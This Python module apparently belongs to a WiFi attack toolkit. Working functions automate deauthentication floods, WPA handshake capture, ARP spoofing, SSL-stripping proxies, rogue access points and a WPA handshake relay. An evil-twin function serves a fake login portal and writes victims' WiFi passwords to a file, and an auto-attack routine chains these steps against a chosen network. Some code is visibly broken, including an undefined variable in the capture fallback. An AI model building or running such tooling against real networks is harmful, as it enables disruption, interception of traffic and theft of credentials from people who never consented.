import logging
"""WiFi operations via BetterCAP with aircrack-ng fallback.

Requires: bettercap (apt install bettercap) or aircrack-ng suite.
For connecting: nmcli (NetworkManager) or wpa_supplicant.
"""

import datetime
import html
import json
import os
import re
import subprocess
import tempfile
import time
from pathlib import Path
from shutil import which
from typing import Dict, List, Optional
logger = logging.getLogger(__name__)


def _check_tool(name: str) -> Optional[str]:
    return which(name)


def _run(cmd: list, timeout: int = 60, check: bool = False) -> dict:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {
            "rc": r.returncode,
            "stdout": r.stdout,
            "stderr": r.stderr,
            "error": None if not check or r.returncode == 0 else r.stderr.strip(),
        }
    except subprocess.TimeoutExpired:
        return {"rc": -1, "stdout": "", "stderr": "", "error": f"Timed out after {timeout}s"}
    except FileNotFoundError:
        return {"rc": -1, "stdout": "", "stderr": "",
                "error": f"Command not found: {' '.join(cmd)}"}
    except Exception as e:
        return {"rc": -1, "stdout": "", "stderr": "", "error": str(e)}


def bettercap_available() -> bool:
    return _check_tool("bettercap") is not None


# ---------------------------------------------------------------------------
# BetterCAP session — run a single command via -eval and get JSON
# ---------------------------------------------------------------------------

def _bettercap_eval(caplet: str, iface: str = "wlan0",
                    timeout: int = 60) -> dict:
    """Run a BetterCAP caplet/command and return parsed JSON output."""
    bc = _check_tool("bettercap")
    if not bc:
        return {"error": "bettercap not installed (apt install bettercap)"}
    cmd = [
        bc, "-no-colors", "-eval", caplet,
        "-iface", iface,
    ]
    return _run(cmd, timeout=timeout)


# ---------------------------------------------------------------------------
# 1. WiFi reconnaissance — scan nearby access points and clients
# ---------------------------------------------------------------------------

def wifi_scan(iface: str = "wlan0", timeout: int = 45) -> dict:
    """Scan for nearby WiFi networks. Returns parsed AP list."""
    # Try BetterCAP first
    if bettercap_available():
        caplet = (
            "wifi.recon on; "
            f"sleep {timeout - 10}; "
            "wifi.show json; "
            "wifi.recon off"
        )
        result = _bettercap_eval(caplet, iface=iface, timeout=timeout)
        if result.get("stdout"):
            try:
                data = json.loads(result["stdout"])
                if isinstance(data, dict):
                    aps = data.get("wifi", {}).get("aps", [])
                    clients = data.get("wifi", {}).get("clients", [])
                    for ap in aps:
                        ap.pop("handshake", None)
                    return {"aps": aps, "clients": clients, "source": "bettercap"}
            except (json.JSONDecodeError, AttributeError):
                pass
        if result.get("error"):
            return {"error": result["error"]}

    # Fallback: airodump-ng
    airodump = _check_tool("airodump-ng")
    if not airodump:
        return {"error": "No WiFi tool found (install bettercap or aircrack-ng)"}
    tmpdir = tempfile.mkdtemp()
    prefix = str(Path(tmpdir) / "scan")
    try:
        subprocess.run(
            [airodump, "-w", prefix, "--output-format", "csv", "--write-interval", "1",
             iface],
            timeout=timeout, capture_output=True,
        )
    except subprocess.TimeoutExpired:
        pass
    aps = _parse_airodump_csv(f"{prefix}-01.csv")
    return {"aps": aps, "source": "airodump-ng", "raw_dir": tmpdir}


def _parse_airodump_csv(csv_path: str) -> list:
    """Parse airodump-ng CSV output into structured AP list."""
    aps = []
    try:
        with open(csv_path, "r", errors="replace") as f:
            in_aps = True
            for line in f:
                stripped = line.strip()
                if stripped.startswith("BSSID,"):
                    in_aps = True
                    continue
                if stripped.startswith("Station"):
                    in_aps = False
                    continue
                if not stripped or not in_aps:
                    continue
                parts = [p.strip() for p in stripped.split(",")]
                if len(parts) >= 14 and parts[0].count(":") == 5:
                    aps.append({
                        "bssid": parts[0],
                        "channel": parts[3],
                        "signal": parts[8],
                        "encryption": parts[5],
                        "essid": parts[13].strip().strip("."),
                    })
    except Exception:

        logger.debug("Exception in wifi_wrapper.py", exc_info=True)
    return aps


# ---------------------------------------------------------------------------
# 2. Deauth attack
# ---------------------------------------------------------------------------

def wifi_deauth(bssid: str, iface: str = "wlan0", station: str = "",
                count: int = 5, timeout: int = 30) -> dict:
    """Send deauthentication frames to a BSSID (and optionally a specific station)."""
    if bettercap_available():
        target = f"{bssid}"
        if station:
            target += f"/{station}"
        caplet = (
            f"wifi.deauth {target}; "
            f"sleep {count * 2}; "
        )
        # Remove the channel lock sleep since deauth runs instantly
        result = _bettercap_eval(caplet, iface=iface, timeout=timeout)
        if result.get("error"):
            return {"error": result["error"]}
        return {"status": f"Deauth sent to {target} ({count} packets)", "source": "bettercap"}

    aireplay = _check_tool("aireplay-ng")
    if not aireplay:
        return {"error": "No deauth tool (install bettercap or aircrack-ng)"}
    cmd = [aireplay, "-0", str(count), "-a", bssid]
    if station:
        cmd += ["-c", station]
    cmd += [iface]
    result = _run(cmd, timeout=timeout)
    if result.get("error"):
        return {"error": result["error"]}
    return {"status": f"Deauth sent to {bssid} x{count}", "source": "aireplay-ng"}


# ---------------------------------------------------------------------------
# 3. WPA handshake capture
# ---------------------------------------------------------------------------

def wifi_handshake_capture(bssid: str, channel: str, iface: str = "wlan0",
                           essid: str = "", timeout: int = 60) -> dict:
    """Capture WPA 4-way handshake. Returns path to capture file if successful."""
    tmpdir = tempfile.mkdtemp()
    cap_path = Path(tmpdir) / "handshake.cap"

    if bettercap_available():
        caplet = (
            f"wifi.recon.channel {channel}; "
            "wifi.recon on; "
            f"wifi.deauth {bssid}; "
            f"sleep {timeout - 10}; "
            "wifi.recon off; "
        )
        result = _bettercap_eval(caplet, iface=iface, timeout=timeout)
        # BetterCAP saves handshakes to ~/.bettercap/handshakes/
        hs_dir = Path.home() / ".bettercap" / "handshakes"
        if hs_dir.exists():
            for f in sorted(hs_dir.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
                if bssid.replace(":", "") in f.name or (essid and essid in f.name):
                    import shutil
                    shutil.copy2(str(f), str(cap_path))
                    return {"capture": str(cap_path), "source": "bettercap", "size": cap_path.stat().st_size}
        if result.get("error"):
            return {"error": result["error"]}
        return {"status": "No handshake captured (try longer timeout or closer range)",
                "source": "bettercap"}

    # Fallback: airodump-ng + aireplay-ng
    airodump = _check_tool("airodump-ng")
    aireplay = _check_tool("aireplay-ng")
    if not airodump:
        return {"error": "No capture tool (install bettercap or aircrack-ng)"}
    prefix = str(Path(tmpdir) / "hs")
    airo_cmd = [airodump, "-c", channel, "-w", prefix, "--bssid", bssid, iface]
    proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    if aireplay:
        subprocess.run(
            [aireplay, "-0", "3", "-a", bssid, iface],
            timeout=15, capture_output=True,
        )
    time.sleep(timeout - 18)
    proc.terminate()
    proc.wait()
    for ext in (".cap", ".pcap"):
        f = Path(f"{prefix}-01{ext}")
        if f.exists():
            return {"capture": str(f), "source": "airodump-ng", "size": f.stat().st_size}
    return {"status": "No handshake captured", "source": "airodump-ng"}


# ---------------------------------------------------------------------------
# 4. Connect to a WiFi network
# ---------------------------------------------------------------------------

def wifi_connect(ssid: str, password: str = "", iface: str = "wlan0",
                 timeout: int = 30) -> dict:
    """Connect to a WiFi network using nmcli or wpa_supplicant."""
    # Try nmcli first
    nmcli = _check_tool("nmcli")
    if nmcli:
        # Ensure wifi is on
        _run([nmcli, "radio", "wifi", "on"], timeout=10)
        if password:
            cmd = [nmcli, "device", "wifi", "connect", ssid,
                   "password", password, "ifname", iface]
        else:
            cmd = [nmcli, "device", "wifi", "connect", ssid, "ifname", iface]
        result = _run(cmd, timeout=timeout)
        if result["rc"] == 0:
            return {"status": f"Connected to '{ssid}' via nmcli", "interface": iface, "source": "nmcli"}
        # nmcli might already be connected — check
        check = _run([nmcli, "-t", "-f", "ACTIVE,SSID", "device", "wifi", "list"],
                     timeout=10)
        if ssid in check.get("stdout", ""):
            return {"status": f"Already connected to '{ssid}'", "interface": iface, "source": "nmcli"}
        return {"error": result.get("stderr", "nmcli connection failed").strip()}

    # Fallback: wpa_supplicant + dhclient
    wpa = _check_tool("wpa_supplicant")
    dhcp = _check_tool("dhclient") or _check_tool("dhcpcd")
    if wpa and dhcp:
        tmpdir = tempfile.mkdtemp()
        conf_path = Path(tmpdir) / "wpa.conf"
        # Generate wpa_passphrase entry
        if password:
            _run(["wpa_passphrase", ssid, password], timeout=10)
            conf = (
                f'network={{\n'
                f'    ssid="{ssid}"\n'
                f'    psk="{password}"\n'
                f'    key_mgmt=WPA-PSK\n'
                f'}}\n'
            )
        else:
            conf = (
                f'network={{\n'
                f'    ssid="{ssid}"\n'
                f'    key_mgmt=NONE\n'
                f'}}\n'
            )
        conf_path.write_text(conf)
        # Kill existing wpa_supplicant on this iface
        _run(["pkill", "-f", f"wpa_supplicant.*{iface}"], timeout=5)
        wpa_proc = subprocess.Popen(
            [wpa, "-B", "-i", iface, "-c", str(conf_path)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        time.sleep(5)
        dhcp_cmd = _check_tool("dhclient") or _check_tool("dhcpcd")
        _run([dhcp_cmd, iface], timeout=15)
        return {"status": f"Connected to '{ssid}' via wpa_supplicant", "interface": iface, "source": "wpa_supplicant"}

    return {"error": "No connection tool (install network-manager or wpa_supplicant+dhclient)"}


# ---------------------------------------------------------------------------
# 5. Network scan after connecting
# ---------------------------------------------------------------------------

def wifi_network_scan(iface: str = "wlan0", subnet: str = "",
                      timeout: int = 60) -> dict:
    """Scan the local network for hosts (ARP scan + ping sweep)."""
    # Get subnet automatically if not provided
    if not subnet:
        ip_cmd = _run(["ip", "-4", "addr", "show", iface], timeout=10)
        match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", ip_cmd.get("stdout", ""))
        if match:
            ip = match.group(1)
            prefix = match.group(2)
            if prefix == "24":
                subnet = ".".join(ip.split(".")[:3]) + ".0/24"
            else:
                subnet = ip + "/" + prefix

    nmap = _check_tool("nmap")
    if nmap and subnet:
        result = _run([nmap, "-sn", "-T4", subnet, "-oG", "-"], timeout=timeout)
        hosts = []
        for line in result.get("stdout", "").split("\n"):
            if "Host:" in line and "(" in line:
                parts = line.split()
                ip_addr = parts[1] if len(parts) > 1 else ""
                status = "up" if "Up" in line else "down"
                hosts.append({"ip": ip_addr, "status": status})
        return {"hosts": hosts, "subnet": subnet, "source": "nmap"}
    elif subnet:
        # Basic ping sweep
        base = ".".join(subnet.split(".")[:3])
        hosts = []
        for i in range(1, 255):
            result = _run(["ping", "-c", "1", "-W", "1", f"{base}.{i}"], timeout=2)
            if result["rc"] == 0:
                hosts.append({"ip": f"{base}.{i}", "status": "up"})
        return {"hosts": hosts, "subnet": subnet, "source": "ping"}
    return {"error": "Could not determine subnet or find scan tool (install nmap)"}


# ---------------------------------------------------------------------------
# 6. ARP spoofing (via BetterCAP)
# ---------------------------------------------------------------------------

def wifi_arp_spoof(target: str, gateway: str = "",
                   iface: str = "wlan0", timeout: int = 60) -> dict:
    """Start ARP spoofing between target and gateway using BetterCAP."""
    if not bettercap_available():
        return {"error": "ARP spoof requires bettercap (apt install bettercap)"}
    gw = gateway or target.rsplit(".", 1)[0] + ".1"
    caplet = (
        f"set arp.spoof.targets {target}; "
        f"set arp.spoof.gateway {gw}; "
        "arp.spoof on; "
        f"sleep {timeout - 5}; "
        "arp.spoof off"
    )
    result = _bettercap_eval(caplet, iface=iface, timeout=timeout)
    if result.get("error"):
        return {"error": result["error"]}
    return {"status": f"ARP spoofed {target} ↔ {gw} on {iface}", "source": "bettercap"}


# ---------------------------------------------------------------------------
# 7. Transparent HTTP proxy (via BetterCAP)
# ---------------------------------------------------------------------------

def wifi_proxy(port: int = 8080, iface: str = "wlan0",
               timeout: int = 120, sslstrip: bool = True) -> dict:
    """Start BetterCAP's transparent HTTP proxy with optional SSL stripping."""
    if not bettercap_available():
        return {"error": "HTTP proxy requires bettercap (apt install bettercap)"}
    caplet = (
        f"set http.proxy.port {port}; "
        f"set http.proxy.sslstrip {'true' if sslstrip else 'false'}; "
        "http.proxy on; "
        f"sleep {timeout - 5}; "
        "http.proxy off"
    )
    result = _bettercap_eval(caplet, iface=iface, timeout=timeout)
    if result.get("error"):
        return {"error": result["error"]}
    return {"status": f"HTTP proxy on :{port} (SSLstrip={sslstrip})", "source": "bettercap"}


# ---------------------------------------------------------------------------
# 8. Rogue AP (airbase-ng / hostapd)
# ---------------------------------------------------------------------------

def airbase_rogue_ap(essid: str, iface: str = "wlan0",
                     channel: str = "6", bssid: str = "",
                     timeout: int = 120) -> dict:
    """Create a rogue access point using airbase-ng.

    Returns after timeout (process runs in background). Use the interface
    that was put into monitor mode (typically wlan0mon).
    """
    airbase = _check_tool("airbase-ng")
    if not airbase:
        # Fallback: hostapd + dnsmasq
        return _hostapd_rogue_ap(essid, iface, channel, bssid, timeout)
    mon = f"{iface}mon" if not iface.endswith("mon") else iface
    cmd = [airbase, "-e", essid, "-c", channel]
    if bssid:
        cmd += ["-W", "1", "-a", bssid]
    else:
        cmd += ["-W", "1"]
    cmd += [mon]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return {
            "status": f"Rogue AP '{essid}' on {mon} (PID: {proc.pid}, {timeout}s timeout)",
            "pid": proc.pid,
            "interface": mon,
            "essid": essid,
            "channel": channel,
            "source": "airbase-ng",
        }
    except Exception as e:
        return {"error": f"airbase-ng failed: {e}"}


def _hostapd_rogue_ap(essid: str, iface: str = "wlan0",
                      channel: str = "6", bssid: str = "",
                      timeout: int = 120) -> dict:
    """Fallback rogue AP using hostapd + dnsmasq."""
    hostapd = _check_tool("hostapd")
    dnsmasq = _check_tool("dnsmasq")
    if not hostapd:
        return {"error": "No rogue AP tool (install airbase-ng or hostapd+dnsmasq)"}
    import tempfile
    tmp = tempfile.mkdtemp()
    conf = Path(tmp) / "hostapd.conf"
    conf.write_text(
        f"interface={iface}\n"
        f"ssid={essid}\n"
        f"channel={channel}\n"
        f"hw_mode=g\n"
        f"auth_algs=1\n"
        f"wmm_enabled=0\n"
        f"driver=nl80211\n"
    )
    try:
        proc = subprocess.Popen(
            [hostapd, str(conf), "-B"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        if dnsmasq:
            dhcp_conf = Path(tmp) / "dnsmasq.conf"
            dhcp_conf.write_text(
                f"interface={iface}\n"
                f"dhcp-range=10.0.0.10,10.0.0.100,12h\n"
                f"dhcp-option=3,10.0.0.1\n"
                f"dhcp-option=6,10.0.0.1\n"
            )
            subprocess.Popen(
                [dnsmasq, "-C", str(dhcp_conf), "--no-daemon"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
        return {
            "status": f"Rogue AP '{essid}' via hostapd on {iface} (PID: {proc.pid})",
            "pid": proc.pid,
            "interface": iface,
            "essid": essid,
            "channel": channel,
            "source": "hostapd",
        }
    except Exception as e:
        return {"error": f"hostapd failed: {e}"}


# ---------------------------------------------------------------------------
# 9. WPA sycophant relay
# ---------------------------------------------------------------------------

def wpa_sycophant_relay(iface: str = "wlan0", target_bssid: str = "",
                        target_essid: str = "", conf_file: str = "",
                        timeout: int = 120) -> dict:
    """Relay WPA 4-way handshake using wpa_sycophant.

    wpa_sycophant acts as a man-in-the-middle for WPA handshakes,
    capturing and replaying the handshake to gain access without
    cracking the password.
    """
    tools_dir = Path("/share/tools")
    sycophant_sh = tools_dir / "wpa_sycophant" / "wpa_sycophant.sh"
    sycophant_py = tools_dir / "wpa_sycophant" / "src" / "wpa_sycophant.py"
    sycophant_exe = _check_tool("wpa_sycophant")

    script = None
    if sycophant_exe:
        script = sycophant_exe
    elif sycophant_sh.exists():
        script = str(sycophant_sh)
    elif sycophant_py.exists():
        script = str(sycophant_py)

    if not script:
        return {"error": "wpa_sycophant not found at /share/tools/wpa_sycophant/"}

    # Generate conf if not provided
    if not conf_file:
        import tempfile
        tmp = tempfile.NamedTemporaryFile(suffix=".conf", delete=False, mode="w")
        conf_path = tmp.name
        tmp.write(
            f"network={{\n"
            f"    ssid=\"{target_essid or 'TARGET'}\"\n"
            f"    bssid={target_bssid or '00:00:00:00:00:00'}\n"
            f"    key_mgmt=WPA-PSK\n"
            f"    scan_ssid=1\n"
            f"    phase1=\"crypto_test=1\"\n"
            f"}}\n"
        )
        tmp.close()

    try:
        proc = subprocess.Popen(
            ["python3", script, "-i", iface, "-c", conf_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        return {
            "status": f"wpa_sycophant relay started on {iface} (PID: {proc.pid})",
            "pid": proc.pid,
            "interface": iface,
            "source": "wpa_sycophant",
        }
    except Exception as e:
        return {"error": f"wpa_sycophant failed: {e}"}


# ---------------------------------------------------------------------------
# 10. mitmproxy intercept
# ---------------------------------------------------------------------------

def mitmproxy_intercept(port: int = 8080, listen_addr: str = "0.0.0.0",
                        mode: str = "transparent", timeout: int = 120) -> dict:
    """Start mitmproxy in transparent or regular proxy mode."""
    tools_dir = Path("/share/tools")
    mitm_dir = tools_dir / "mitmproxy"
    mitm_bin = _check_tool("mitmproxy") or _check_tool("mitmdump") or _check_tool("mitmweb")
    if not mitm_bin:
        return {"error": "mitmproxy not found (pip install mitmproxy or check /share/tools/mitmproxy)"}

    mode_flag = "--mode" if mitm_bin.endswith("mitmdump") else "-m"
    mode_val = "transparent" if mode == "transparent" else "regular"

    try:
        proc = subprocess.Popen(
            [mitm_bin, mode_flag, mode_val, "--listen-port", str(port),
             "--listen-host", listen_addr],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        return {
            "status": f"mitmproxy started on {listen_addr}:{port} (mode: {mode}, PID: {proc.pid})",
            "pid": proc.pid,
            "port": port,
            "mode": mode,
            "source": "mitmproxy",
        }
    except Exception as e:
        return {"error": f"mitmproxy failed: {e}"}


# ---------------------------------------------------------------------------
# 11. Full evil twin — rogue AP + captive portal + proxy
# ---------------------------------------------------------------------------

def evil_twin_full(essid: str, iface: str = "wlan0", channel: str = "6",
                   bssid: str = "", portal_dir: str = "",
                   proxy_port: int = 8080, timeout: int = 300) -> dict:
    """Full evil twin attack: rogue AP + captive portal + transparent proxy.

    Steps:
    1. Start airbase-ng rogue AP with the target ESSID
    2. Configure NAT/DHCP for victims
    3. Start a captive portal HTTP server on port 80
    4. Start mitmproxy/BetterCAP proxy to capture credentials
    """
    results = {}
    import shutil
    import tempfile

    # 1. Start rogue AP
    ap = airbase_rogue_ap(essid, iface=iface, channel=channel, bssid=bssid, timeout=timeout)
    results["rogue_ap"] = ap
    if ap.get("error"):
        return {"error": f"Rogue AP failed: {ap['error']}", **results}

    # 2. Set up NAT (iptables) on the AP interface
    ap_iface = ap.get("interface", f"{iface}mon")
    at0 = "at0"  # airbase-ng creates at0 bridge
    iptables_cmds = [
        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", at0, "-j", "MASQUERADE"],
        ["iptables", "-A", "FORWARD", "-i", at0, "-j", "ACCEPT"],
        ["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
    ]
    for cmd in iptables_cmds:
        _run(cmd, timeout=10)
    # Configure at0 interface
    _run(["ifconfig", at0, "10.0.0.1", "netmask", "255.255.255.0", "up"], timeout=10)

    # 3. Start dnsmasq for DHCP on at0
    dnsmasq = _check_tool("dnsmasq")
    if dnsmasq:
        tmp = tempfile.mkdtemp()
        dhcp_conf = Path(tmp) / "dnsmasq.conf"
        dhcp_conf.write_text(
            f"interface={at0}\n"
            f"dhcp-range=10.0.0.10,10.0.0.100,12h\n"
            f"dhcp-option=3,10.0.0.1\n"
            f"dhcp-option=6,10.0.0.1\n"
            f"address=/#/10.0.0.1\n"
        )
        dns_proc = subprocess.Popen(
            [dnsmasq, "-C", str(dhcp_conf), "--no-daemon"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        results["dhcp"] = {"pid": dns_proc.pid, "source": "dnsmasq"}

    # 4. Start captive portal HTTP server
    if portal_dir:
        portal_path = Path(portal_dir)
    else:
        portal_path = Path(tempfile.mkdtemp()) / "portal"
        portal_path.mkdir(parents=True, exist_ok=True)
        # Write a default captive portal page
        (portal_path / "index.html").write_text(
            "<!DOCTYPE html><html><body>"
            "<h2>WiFi Login</h2>"
            "<form method='POST' action='/login'>"
            "SSID: <input name='ssid' value='{}' readonly><br>"
            "Password: <input type='password' name='password' required><br>"
            "<input type='submit' value='Connect'>"
            "</form></body></html>".format(html.escape(essid))
        )
    results["portal_dir"] = str(portal_path)

    # Start a simple Python HTTP server as captive portal
    import http.server
    import socketserver
    import threading

    class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/login":
                self.send_response(200)
                self.end_headers()
                pw = self.path.split("password=")[-1] if "password=" in self.path else ""
                self.wfile.write(f"<html><body><h2>Connecting...</h2><p>Password: {pw}</p></body></html>".encode())
            else:
                super().do_GET()

        def do_POST(self):
            if self.path == "/login":
                content_length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(content_length).decode()
                import urllib.parse
                params = urllib.parse.parse_qs(body)
                captured_pw = params.get("password", [""])[0]
                captured_ssid = params.get("ssid", [essid])[0]
                # Log captured credentials
                log_entry = f"[{datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")}] SSID: {captured_ssid}  PASSWORD: {captured_pw}\n"
                log_path = Path(portal_path) / "captured_creds.txt"
                with open(str(log_path), "a") as lf:
                    lf.write(log_entry)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Connected!</h2><p>You may now browse.</p></body></html>")

    portal_server = socketserver.TCPServer(("0.0.0.0", 80), CaptiveHandler)
    portal_thread = threading.Thread(target=portal_server.serve_forever, daemon=True)
    portal_thread.start()
    results["captive_portal"] = {"port": 80, "dir": str(portal_path)}

    # 5. Start mitmproxy for traffic capture
    try:
        proxy = mitmproxy_intercept(port=proxy_port, mode="transparent")
        results["proxy"] = proxy
    except Exception:
        # Fallback to BetterCAP proxy
        bettercap_result = wifi_proxy(port=proxy_port, iface=iface, sslstrip=True)
        results["proxy"] = bettercap_result

    return {
        "status": f"Evil twin '{essid}' running on {ap_iface} — portal at :80, proxy at :{proxy_port}",
        "essid": essid,
        "interface": ap_iface,
        "portal_dir": str(portal_path),
        "proxy_port": proxy_port,
        **results,
    }


# ---------------------------------------------------------------------------
# 12. Auto-attack — try multiple vectors
# ---------------------------------------------------------------------------

def wifi_auto_attack(iface: str = "wlan0", target_bssid: str = "",
                     target_essid: str = "", channel: str = "",
                     timeout: int = 180) -> dict:
    """Automatically try multiple WiFi attack vectors against a target.

    Tries in order:
    1. Deauth + handshake capture (for cracking)
    2. EAPHammer enterprise attack (if WPA2-EAP)
    3. Evil twin with captive portal (for PSK)
    4. wpa_sycophant relay
    """
    results = {"target": f"{target_essid} ({target_bssid})", "attacks": {}}

    # 1. Handshake capture
    hs_ch = channel or "6"
    hs = wifi_handshake_capture(
        target_bssid, hs_ch, iface=iface,
        essid=target_essid, timeout=min(timeout // 3, 60),
    )
    results["attacks"]["handshake"] = hs

    # 2. EAPHammer if there's any EAP indicator
    if "EAP" in target_essid or not target_essid:
        try:
            from .tool_wrappers import eaphammer_attack
            eap = eaphammer_attack(
                bssid=target_bssid, essid=target_essid or "TARGET",
                iface=iface, auth_type="WPA2-EAP",
            )
            results["attacks"]["eaphammer"] = eap
        except Exception:

            logger.debug("Exception in wifi_wrapper.py", exc_info=True)

    # 3. Deauth to disrupt
    deauth = wifi_deauth(target_bssid, iface=iface, count=3)
    results["attacks"]["deauth"] = deauth

    # 4. Evil twin with captive portal
    et = evil_twin_full(
        target_essid or "FreeWiFi", iface=iface,
        channel=hs_ch, bssid=target_bssid,
        timeout=min(timeout // 3, 120),
    )
    results["attacks"]["evil_twin"] = et

    return results